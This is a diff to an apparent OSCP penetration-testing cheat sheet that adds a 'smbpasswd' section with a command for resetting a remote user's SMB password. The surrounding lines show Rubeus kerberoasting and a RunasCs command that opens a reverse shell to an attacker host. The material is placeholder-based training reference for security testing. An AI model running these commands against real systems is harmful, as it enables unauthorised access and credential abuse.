@@ -127,6 +127,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [rpcclient](https://github.com/0xsyr0/OSCP#rpcclient)
 		- [Rubeus](https://github.com/0xsyr0/OSCP#rubeus)
 		- [RunasCs](https://github.com/0xsyr0/OSCP#runascs)
+    		- [smbpasswd](https://github.com/0xsyr0/OSCP#smbpasswd)
 		- [winexe](https://github.com/0xsyr0/OSCP#winexe)
 	- [CVE](https://github.com/0xsyr0/OSCP#cve)
 		- [CVE-2014-6271: Shellshock RCE PoC](https://github.com/0xsyr0/OSCP#cve-2014-6271-shellshock-rce-poc)
@@ -4073,6 +4074,12 @@ Rubeus.exe kerberoast /user:<USERNAME>
 ```c
 ./RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
 ./RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
+```
+
+#### smbpasswd
+
+```c
+smbpasswd -U <RHOST>\<USERNAME> -r <RHOST>
 ```
 
 #### winexe
